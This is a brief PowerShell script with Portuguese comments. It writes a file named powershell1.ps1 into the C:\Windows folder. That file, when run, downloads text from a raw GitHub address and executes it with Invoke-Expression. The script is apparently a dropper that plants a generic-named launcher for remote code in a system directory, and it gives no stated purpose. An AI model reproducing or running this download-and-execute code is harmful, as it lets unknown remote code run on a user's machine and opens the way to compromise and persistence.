# Define o conteúdo do script
$scriptContent = @"
    Invoke-Expression -Command (Invoke-RestMethod -Uri "https://raw.githubusercontent.com/so251/olaquerida/main/script.txt").Content
"@

# Define o caminho completo para salvar o arquivo
$filePath = "C:\Windows\powershell1.ps1"

# Salva o conteúdo no arquivo especificado
Set-Content -Path $filePath -Value $scriptContent -Force
